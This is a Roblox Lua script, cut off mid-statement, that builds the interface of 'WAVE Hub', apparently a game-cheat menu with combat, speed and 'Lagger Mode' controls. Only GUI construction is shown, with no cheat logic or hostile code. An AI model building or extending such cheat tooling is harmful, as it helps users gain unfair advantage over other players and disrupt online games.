-- https://discord.gg/7Ar8QGZB2j

local G = {}

G.WAVEHubV1 = Instance.new("ScreenGui")
G.WAVEHubV1.Name = "WAVEHubV1"
G.WAVEHubV1.ResetOnSpawn = false
G.WAVEHubV1.DisplayOrder = 2147483647
G.WAVEHubV1.IgnoreGuiInset = true
G.WAVEHubV1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G.WAVEHubV1.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets

G.MainOuter = Instance.new("Frame")
G.MainOuter.Name = "MainOuter"
G.MainOuter.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.MainOuter.BorderSizePixel = 0
G.MainOuter.ClipsDescendants = true
G.MainOuter.Position = UDim2.new(0, 28, 0, 22)
G.MainOuter.Size = UDim2.new(0, 280, 0, 48)
G.MainOuter.Visible = false
G.MainOuter.Parent = G.WAVEHubV1

G.UIScale = Instance.new("UIScale")
G.UIScale.Scale = 0.69999998807907104
G.UIScale.Parent = G.MainOuter

G.UICorner = Instance.new("UICorner")
G.UICorner.CornerRadius = UDim.new(0, 20)
G.UICorner.Parent = G.MainOuter

G.MenuBgImage = Instance.new("ImageLabel")
G.MenuBgImage.Name = "MenuBgImage"
G.MenuBgImage.BackgroundTransparency = 1
G.MenuBgImage.BorderSizePixel = 0
G.MenuBgImage.Size = UDim2.new(1, 0, 1, 0)
G.MenuBgImage.Image = "rbxassetid://130935005587354"
G.MenuBgImage.ImageTransparency = 0.55000001192092896
G.MenuBgImage.ScaleType = Enum.ScaleType.Crop
G.MenuBgImage.Parent = G.MainOuter

G.UICorner_2 = Instance.new("UICorner")
G.UICorner_2.CornerRadius = UDim.new(0, 20)
G.UICorner_2.Parent = G.MenuBgImage

G.MenuBgOverlay = Instance.new("Frame")
G.MenuBgOverlay.Name = "MenuBgOverlay"
G.MenuBgOverlay.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.MenuBgOverlay.BackgroundTransparency = 0.44999998807907104
G.MenuBgOverlay.BorderSizePixel = 0
G.MenuBgOverlay.Size = UDim2.new(1, 0, 1, 0)
G.MenuBgOverlay.ZIndex = 2
G.MenuBgOverlay.Parent = G.MainOuter

G.UICorner_3 = Instance.new("UICorner")
G.UICorner_3.CornerRadius = UDim.new(0, 20)
G.UICorner_3.Parent = G.MenuBgOverlay

G.HeaderBar = Instance.new("Frame")
G.HeaderBar.Name = "HeaderBar"
G.HeaderBar.BackgroundColor3 = Color3.fromRGB(5, 12, 35)
G.HeaderBar.BorderSizePixel = 0
G.HeaderBar.ClipsDescendants = true
G.HeaderBar.Size = UDim2.new(1, 0, 0, 48)
G.HeaderBar.ZIndex = 4
G.HeaderBar.Parent = G.MainOuter

G.UICorner_4 = Instance.new("UICorner")
G.UICorner_4.CornerRadius = UDim.new(0, 20)
G.UICorner_4.Parent = G.HeaderBar

G.HeaderFill = Instance.new("Frame")
G.HeaderFill.Name = "HeaderFill"
G.HeaderFill.BackgroundColor3 = Color3.fromRGB(5, 12, 35)
G.HeaderFill.BackgroundTransparency = 1
G.HeaderFill.BorderSizePixel = 0
G.HeaderFill.Position = UDim2.new(0, 0, 0.5, 0)
G.HeaderFill.Size = UDim2.new(1, 0, 0.5, 0)
G.HeaderFill.ZIndex = 5
G.HeaderFill.Parent = G.HeaderBar

G.WaveHeaderLogo = Instance.new("ImageLabel")
G.WaveHeaderLogo.Name = "WaveHeaderLogo"
G.WaveHeaderLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G.WaveHeaderLogo.BackgroundTransparency = 1
G.WaveHeaderLogo.BorderSizePixel = 0
G.WaveHeaderLogo.Position = UDim2.new(0, 12, 0, 10)
G.WaveHeaderLogo.Size = UDim2.new(0, 28, 0, 28)
G.WaveHeaderLogo.ZIndex = 6
G.WaveHeaderLogo.Image = "rbxthumb://type=Asset&id=88821845971760&w=420&h=420"
G.WaveHeaderLogo.ScaleType = Enum.ScaleType.Crop
G.WaveHeaderLogo.Parent = G.HeaderBar

G.UICorner_5 = Instance.new("UICorner")
G.UICorner_5.CornerRadius = UDim.new(0, 14)
G.UICorner_5.Parent = G.WaveHeaderLogo

G.TextLabel = Instance.new("TextLabel")
G.TextLabel.BackgroundTransparency = 1
G.TextLabel.Position = UDim2.new(0, 48, 0, 10)
G.TextLabel.Size = UDim2.new(0, 140, 0, 28)
G.TextLabel.ZIndex = 6
G.TextLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel.Text = "WAVE"
G.TextLabel.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel.TextSize = 16
G.TextLabel.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel.Parent = G.HeaderBar

G.MinimizedTitleImage = Instance.new("ImageLabel")
G.MinimizedTitleImage.Name = "MinimizedTitleImage"
G.MinimizedTitleImage.BackgroundTransparency = 1
G.MinimizedTitleImage.Position = UDim2.new(0, 14, 0, 10)
G.MinimizedTitleImage.Size = UDim2.new(0, 132, 0, 28)
G.MinimizedTitleImage.Visible = false
G.MinimizedTitleImage.ZIndex = 7
G.MinimizedTitleImage.Image = "rbxthumb://type=Asset&id=88821845971760&w=420&h=420"
G.MinimizedTitleImage.ScaleType = Enum.ScaleType.Fit
G.MinimizedTitleImage.Parent = G.HeaderBar

G.TextButton = Instance.new("TextButton")
G.TextButton.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.TextButton.BorderSizePixel = 0
G.TextButton.Position = UDim2.new(1, -30, 0, 13)
G.TextButton.Size = UDim2.new(0, 22, 0, 22)
G.TextButton.ZIndex = 100
G.TextButton.AutoButtonColor = false
G.TextButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton.Text = "-"
G.TextButton.TextColor3 = Color3.fromRGB(135, 145, 165)
G.TextButton.TextSize = 14
G.TextButton.Parent = G.HeaderBar

G.UICorner_6 = Instance.new("UICorner")
G.UICorner_6.CornerRadius = UDim.new(0, 2)
G.UICorner_6.Parent = G.TextButton

G.WaveNavigation = Instance.new("Frame")
G.WaveNavigation.Name = "WaveNavigation"
G.WaveNavigation.BackgroundTransparency = 1
G.WaveNavigation.BorderSizePixel = 0
G.WaveNavigation.Position = UDim2.new(0, 8, 0, 51)
G.WaveNavigation.Size = UDim2.new(1, -16, 0, 40)
G.WaveNavigation.ZIndex = 6
G.WaveNavigation.Parent = G.MainOuter

G.UIListLayout = Instance.new("UIListLayout")
G.UIListLayout.FillDirection = Enum.FillDirection.Horizontal
G.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
G.UIListLayout.Padding = UDim.new(0, 4)
G.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
G.UIListLayout.Parent = G.WaveNavigation

G.WaveNav_MAIN = Instance.new("TextButton")
G.WaveNav_MAIN.Name = "WaveNav_MAIN"
G.WaveNav_MAIN.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.WaveNav_MAIN.BorderSizePixel = 0
G.WaveNav_MAIN.LayoutOrder = 1
G.WaveNav_MAIN.Size = UDim2.new(0, 48, 0, 28)
G.WaveNav_MAIN.ZIndex = 7
G.WaveNav_MAIN.AutoButtonColor = false
G.WaveNav_MAIN.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveNav_MAIN.Text = "MAIN"
G.WaveNav_MAIN.TextColor3 = Color3.fromRGB(240, 245, 255)
G.WaveNav_MAIN.Parent = G.WaveNavigation

G.UICorner_7 = Instance.new("UICorner")
G.UICorner_7.CornerRadius = UDim.new(0, 7)
G.UICorner_7.Parent = G.WaveNav_MAIN

G.UIStroke = Instance.new("UIStroke")
G.UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke.Color = Color3.fromRGB(45, 130, 230)
G.UIStroke.Thickness = 1.2000000476837158
G.UIStroke.Parent = G.WaveNav_MAIN

G.WaveNav_COMBAT = Instance.new("TextButton")
G.WaveNav_COMBAT.Name = "WaveNav_COMBAT"
G.WaveNav_COMBAT.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WaveNav_COMBAT.BackgroundTransparency = 0.2199999988079071
G.WaveNav_COMBAT.BorderSizePixel = 0
G.WaveNav_COMBAT.LayoutOrder = 2
G.WaveNav_COMBAT.Size = UDim2.new(0, 48, 0, 28)
G.WaveNav_COMBAT.ZIndex = 7
G.WaveNav_COMBAT.AutoButtonColor = false
G.WaveNav_COMBAT.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveNav_COMBAT.Text = "COMBAT"
G.WaveNav_COMBAT.TextColor3 = Color3.fromRGB(70, 115, 180)
G.WaveNav_COMBAT.Parent = G.WaveNavigation

G.UICorner_8 = Instance.new("UICorner")
G.UICorner_8.CornerRadius = UDim.new(0, 7)
G.UICorner_8.Parent = G.WaveNav_COMBAT

G.UIStroke_2 = Instance.new("UIStroke")
G.UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_2.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_2.Parent = G.WaveNav_COMBAT

G.WaveNav_MISC = Instance.new("TextButton")
G.WaveNav_MISC.Name = "WaveNav_MISC"
G.WaveNav_MISC.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WaveNav_MISC.BackgroundTransparency = 0.2199999988079071
G.WaveNav_MISC.BorderSizePixel = 0
G.WaveNav_MISC.LayoutOrder = 3
G.WaveNav_MISC.Size = UDim2.new(0, 48, 0, 28)
G.WaveNav_MISC.ZIndex = 7
G.WaveNav_MISC.AutoButtonColor = false
G.WaveNav_MISC.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveNav_MISC.Text = "MISC"
G.WaveNav_MISC.TextColor3 = Color3.fromRGB(70, 115, 180)
G.WaveNav_MISC.Parent = G.WaveNavigation

G.UICorner_9 = Instance.new("UICorner")
G.UICorner_9.CornerRadius = UDim.new(0, 7)
G.UICorner_9.Parent = G.WaveNav_MISC

G.UIStroke_3 = Instance.new("UIStroke")
G.UIStroke_3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_3.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_3.Parent = G.WaveNav_MISC

G.WaveNav_VISUALS = Instance.new("TextButton")
G.WaveNav_VISUALS.Name = "WaveNav_VISUALS"
G.WaveNav_VISUALS.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WaveNav_VISUALS.BackgroundTransparency = 0.2199999988079071
G.WaveNav_VISUALS.BorderSizePixel = 0
G.WaveNav_VISUALS.LayoutOrder = 4
G.WaveNav_VISUALS.Size = UDim2.new(0, 48, 0, 28)
G.WaveNav_VISUALS.ZIndex = 7
G.WaveNav_VISUALS.AutoButtonColor = false
G.WaveNav_VISUALS.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveNav_VISUALS.Text = "VISUALS"
G.WaveNav_VISUALS.TextColor3 = Color3.fromRGB(70, 115, 180)
G.WaveNav_VISUALS.Parent = G.WaveNavigation

G.UICorner_10 = Instance.new("UICorner")
G.UICorner_10.CornerRadius = UDim.new(0, 7)
G.UICorner_10.Parent = G.WaveNav_VISUALS

G.UIStroke_4 = Instance.new("UIStroke")
G.UIStroke_4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_4.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_4.Parent = G.WaveNav_VISUALS

G.WaveNav_CUSTOMIZE = Instance.new("TextButton")
G.WaveNav_CUSTOMIZE.Name = "WaveNav_CUSTOMIZE"
G.WaveNav_CUSTOMIZE.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WaveNav_CUSTOMIZE.BackgroundTransparency = 0.2199999988079071
G.WaveNav_CUSTOMIZE.BorderSizePixel = 0
G.WaveNav_CUSTOMIZE.LayoutOrder = 5
G.WaveNav_CUSTOMIZE.Size = UDim2.new(0, 48, 0, 28)
G.WaveNav_CUSTOMIZE.ZIndex = 7
G.WaveNav_CUSTOMIZE.AutoButtonColor = false
G.WaveNav_CUSTOMIZE.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.WaveNav_CUSTOMIZE.Text = "UI"
G.WaveNav_CUSTOMIZE.TextColor3 = Color3.fromRGB(70, 115, 180)
G.WaveNav_CUSTOMIZE.Parent = G.WaveNavigation

G.UICorner_11 = Instance.new("UICorner")
G.UICorner_11.CornerRadius = UDim.new(0, 7)
G.UICorner_11.Parent = G.WaveNav_CUSTOMIZE

G.UIStroke_5 = Instance.new("UIStroke")
G.UIStroke_5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_5.Color = Color3.fromRGB(25, 90, 185)
G.UIStroke_5.Parent = G.WaveNav_CUSTOMIZE

G.WavePage_Speed = Instance.new("ScrollingFrame")
G.WavePage_Speed.Name = "WavePage_Speed"
G.WavePage_Speed.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Speed.BackgroundTransparency = 1
G.WavePage_Speed.BorderSizePixel = 0
G.WavePage_Speed.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Speed.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Speed.Visible = false
G.WavePage_Speed.ZIndex = 3
G.WavePage_Speed.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Speed.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Speed.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Speed.ScrollBarImageTransparency = 0.5
G.WavePage_Speed.ScrollBarThickness = 3
G.WavePage_Speed.Parent = G.MainOuter

G.UICorner_12 = Instance.new("UICorner")
G.UICorner_12.CornerRadius = UDim.new(0, 20)
G.UICorner_12.Parent = G.WavePage_Speed

G.UIListLayout_2 = Instance.new("UIListLayout")
G.UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_2.Parent = G.WavePage_Speed

G.UIPadding = Instance.new("UIPadding")
G.UIPadding.PaddingBottom = UDim.new(0, 12)
G.UIPadding.PaddingLeft = UDim.new(0, 8)
G.UIPadding.PaddingRight = UDim.new(0, 8)
G.UIPadding.PaddingTop = UDim.new(0, 6)
G.UIPadding.Parent = G.WavePage_Speed

G.Frame = Instance.new("Frame")
G.Frame.BackgroundTransparency = 1
G.Frame.BorderSizePixel = 0
G.Frame.LayoutOrder = 1
G.Frame.Size = UDim2.new(1, 0, 0, 28)
G.Frame.Parent = G.WavePage_Speed

G.TextLabel_2 = Instance.new("TextLabel")
G.TextLabel_2.BackgroundTransparency = 1
G.TextLabel_2.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_2.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_2.Text = "SPEED"
G.TextLabel_2.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_2.TextSize = 13
G.TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_2.Parent = G.Frame

G.Frame_2 = Instance.new("Frame")
G.Frame_2.BackgroundTransparency = 1
G.Frame_2.BorderSizePixel = 0
G.Frame_2.LayoutOrder = 2
G.Frame_2.Size = UDim2.new(1, 0, 0, 2)
G.Frame_2.Parent = G.WavePage_Speed

G.Frame_3 = Instance.new("Frame")
G.Frame_3.BackgroundTransparency = 1
G.Frame_3.BorderSizePixel = 0
G.Frame_3.LayoutOrder = 2
G.Frame_3.Size = UDim2.new(1, 0, 0, 38)
G.Frame_3.Parent = G.WavePage_Speed

G.TextLabel_3 = Instance.new("TextLabel")
G.TextLabel_3.BackgroundTransparency = 1
G.TextLabel_3.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_3.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_3.Text = "Normal Speed"
G.TextLabel_3.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_3.TextSize = 11
G.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_3.Parent = G.Frame_3

G.Frame_4 = Instance.new("Frame")
G.Frame_4.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_4.BorderSizePixel = 0
G.Frame_4.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_4.Size = UDim2.new(0, 54, 0, 26)
G.Frame_4.Parent = G.Frame_3

G.UICorner_13 = Instance.new("UICorner")
G.UICorner_13.CornerRadius = UDim.new(0, 6)
G.UICorner_13.Parent = G.Frame_4

G.UIStroke_6 = Instance.new("UIStroke")
G.UIStroke_6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_6.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_6.Parent = G.Frame_4

G.TextBox = Instance.new("TextBox")
G.TextBox.BackgroundTransparency = 1
G.TextBox.Position = UDim2.new(0, 3, 0, 0)
G.TextBox.Size = UDim2.new(1, -6, 1, 0)
G.TextBox.ZIndex = 8
G.TextBox.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox.Text = "60"
G.TextBox.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox.TextSize = 11
G.TextBox.ClearTextOnFocus = false
G.TextBox.Parent = G.Frame_4

G.Frame_5 = Instance.new("Frame")
G.Frame_5.BackgroundTransparency = 1
G.Frame_5.BorderSizePixel = 0
G.Frame_5.LayoutOrder = 3
G.Frame_5.Size = UDim2.new(1, 0, 0, 38)
G.Frame_5.Parent = G.WavePage_Speed

G.TextLabel_4 = Instance.new("TextLabel")
G.TextLabel_4.BackgroundTransparency = 1
G.TextLabel_4.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_4.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_4.Text = "Carry Speed"
G.TextLabel_4.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_4.TextSize = 11
G.TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_4.Parent = G.Frame_5

G.Frame_6 = Instance.new("Frame")
G.Frame_6.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_6.BorderSizePixel = 0
G.Frame_6.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_6.Size = UDim2.new(0, 54, 0, 26)
G.Frame_6.Parent = G.Frame_5

G.UICorner_14 = Instance.new("UICorner")
G.UICorner_14.CornerRadius = UDim.new(0, 6)
G.UICorner_14.Parent = G.Frame_6

G.UIStroke_7 = Instance.new("UIStroke")
G.UIStroke_7.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_7.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_7.Parent = G.Frame_6

G.TextBox_2 = Instance.new("TextBox")
G.TextBox_2.BackgroundTransparency = 1
G.TextBox_2.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_2.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_2.ZIndex = 8
G.TextBox_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_2.Text = "30"
G.TextBox_2.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_2.TextSize = 11
G.TextBox_2.ClearTextOnFocus = false
G.TextBox_2.Parent = G.Frame_6

G.Frame_7 = Instance.new("Frame")
G.Frame_7.BackgroundTransparency = 1
G.Frame_7.BorderSizePixel = 0
G.Frame_7.LayoutOrder = 6
G.Frame_7.Size = UDim2.new(1, 0, 0, 38)
G.Frame_7.Parent = G.WavePage_Speed

G.TextLabel_5 = Instance.new("TextLabel")
G.TextLabel_5.BackgroundTransparency = 1
G.TextLabel_5.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_5.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_5.Text = "Lagger Normal Speed"
G.TextLabel_5.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_5.TextSize = 11
G.TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_5.Parent = G.Frame_7

G.Frame_8 = Instance.new("Frame")
G.Frame_8.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_8.BorderSizePixel = 0
G.Frame_8.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_8.Size = UDim2.new(0, 54, 0, 26)
G.Frame_8.Parent = G.Frame_7

G.UICorner_15 = Instance.new("UICorner")
G.UICorner_15.CornerRadius = UDim.new(0, 6)
G.UICorner_15.Parent = G.Frame_8

G.UIStroke_8 = Instance.new("UIStroke")
G.UIStroke_8.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_8.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_8.Parent = G.Frame_8

G.TextBox_3 = Instance.new("TextBox")
G.TextBox_3.BackgroundTransparency = 1
G.TextBox_3.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_3.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_3.ZIndex = 8
G.TextBox_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_3.Text = "15"
G.TextBox_3.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_3.TextSize = 11
G.TextBox_3.ClearTextOnFocus = false
G.TextBox_3.Parent = G.Frame_8

G.Frame_9 = Instance.new("Frame")
G.Frame_9.BackgroundTransparency = 1
G.Frame_9.BorderSizePixel = 0
G.Frame_9.LayoutOrder = 7
G.Frame_9.Size = UDim2.new(1, 0, 0, 38)
G.Frame_9.Parent = G.WavePage_Speed

G.TextLabel_6 = Instance.new("TextLabel")
G.TextLabel_6.BackgroundTransparency = 1
G.TextLabel_6.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_6.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_6.Text = "Lagger Carry Speed"
G.TextLabel_6.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_6.TextSize = 11
G.TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_6.Parent = G.Frame_9

G.Frame_10 = Instance.new("Frame")
G.Frame_10.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_10.BorderSizePixel = 0
G.Frame_10.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_10.Size = UDim2.new(0, 54, 0, 26)
G.Frame_10.Parent = G.Frame_9

G.UICorner_16 = Instance.new("UICorner")
G.UICorner_16.CornerRadius = UDim.new(0, 6)
G.UICorner_16.Parent = G.Frame_10

G.UIStroke_9 = Instance.new("UIStroke")
G.UIStroke_9.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_9.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_9.Parent = G.Frame_10

G.TextBox_4 = Instance.new("TextBox")
G.TextBox_4.BackgroundTransparency = 1
G.TextBox_4.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_4.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_4.ZIndex = 8
G.TextBox_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_4.Text = "10"
G.TextBox_4.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_4.TextSize = 11
G.TextBox_4.ClearTextOnFocus = false
G.TextBox_4.Parent = G.Frame_10

G.Frame_11 = Instance.new("Frame")
G.Frame_11.BackgroundTransparency = 1
G.Frame_11.BorderSizePixel = 0
G.Frame_11.LayoutOrder = 7
G.Frame_11.Size = UDim2.new(1, 0, 0, 2)
G.Frame_11.Parent = G.WavePage_Speed

G.Frame_12 = Instance.new("Frame")
G.Frame_12.BackgroundTransparency = 1
G.Frame_12.BorderSizePixel = 0
G.Frame_12.LayoutOrder = 5
G.Frame_12.Size = UDim2.new(1, 0, 0, 34)
G.Frame_12.Parent = G.WavePage_Speed

G.TextLabel_7 = Instance.new("TextLabel")
G.TextLabel_7.BackgroundTransparency = 1
G.TextLabel_7.Position = UDim2.new(0, 12, 0.5, -7)
G.TextLabel_7.Size = UDim2.new(0, 100, 0, 14)
G.TextLabel_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_7.Text = "Speed Mode"
G.TextLabel_7.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_7.TextSize = 11
G.TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_7.Parent = G.Frame_12

G.TextButton_2 = Instance.new("TextButton")
G.TextButton_2.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_2.BorderSizePixel = 0
G.TextButton_2.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_2.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_2.Text = "Normal"
G.TextButton_2.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_2.TextSize = 11
G.TextButton_2.Parent = G.Frame_12

G.UICorner_17 = Instance.new("UICorner")
G.UICorner_17.CornerRadius = UDim.new(0, 4)
G.UICorner_17.Parent = G.TextButton_2

G.UIStroke_10 = Instance.new("UIStroke")
G.UIStroke_10.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_10.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_10.Parent = G.TextButton_2

G.Frame_13 = Instance.new("Frame")
G.Frame_13.BackgroundTransparency = 1
G.Frame_13.BorderSizePixel = 0
G.Frame_13.LayoutOrder = 9
G.Frame_13.Size = UDim2.new(1, 0, 0, 2)
G.Frame_13.Parent = G.WavePage_Speed

G.Frame_14 = Instance.new("Frame")
G.Frame_14.BackgroundTransparency = 1
G.Frame_14.BorderSizePixel = 0
G.Frame_14.LayoutOrder = 9
G.Frame_14.Size = UDim2.new(1, 0, 0, 34)
G.Frame_14.Parent = G.WavePage_Speed

G.TextLabel_8 = Instance.new("TextLabel")
G.TextLabel_8.BackgroundTransparency = 1
G.TextLabel_8.Position = UDim2.new(0, 12, 0.5, -7)
G.TextLabel_8.Size = UDim2.new(0, 100, 0, 14)
G.TextLabel_8.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_8.Text = "Lagger Mode"
G.TextLabel_8.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_8.TextSize = 11
G.TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_8.Parent = G.Frame_14

G.TextButton_3 = Instance.new("TextButton")
G.TextButton_3.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_3.BorderSizePixel = 0
G.TextButton_3.Position = UDim2.new(1, -88, 0.5, -13)
G.TextButton_3.Size = UDim2.new(0, 80, 0, 26)
G.TextButton_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_3.Text = "Lagger Off"
G.TextButton_3.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_3.TextSize = 11
G.TextButton_3.Parent = G.Frame_14

G.UICorner_18 = Instance.new("UICorner")
G.UICorner_18.CornerRadius = UDim.new(0, 4)
G.UICorner_18.Parent = G.TextButton_3

G.UIStroke_11 = Instance.new("UIStroke")
G.UIStroke_11.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_11.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_11.Parent = G.TextButton_3

G.Frame_15 = Instance.new("Frame")
G.Frame_15.BackgroundTransparency = 1
G.Frame_15.BorderSizePixel = 0
G.Frame_15.LayoutOrder = 11
G.Frame_15.Size = UDim2.new(1, 0, 0, 2)
G.Frame_15.Parent = G.WavePage_Speed

G.Frame_16 = Instance.new("Frame")
G.Frame_16.BackgroundTransparency = 1
G.Frame_16.BorderSizePixel = 0
G.Frame_16.ClipsDescendants = true
G.Frame_16.LayoutOrder = 26
G.Frame_16.Size = UDim2.new(1, 0, 0, 34)
G.Frame_16.Visible = false
G.Frame_16.Parent = G.WavePage_Speed

G.TextLabel_9 = Instance.new("TextLabel")
G.TextLabel_9.BackgroundTransparency = 1
G.TextLabel_9.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_9.Size = UDim2.new(1, -148, 1, 0)
G.TextLabel_9.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
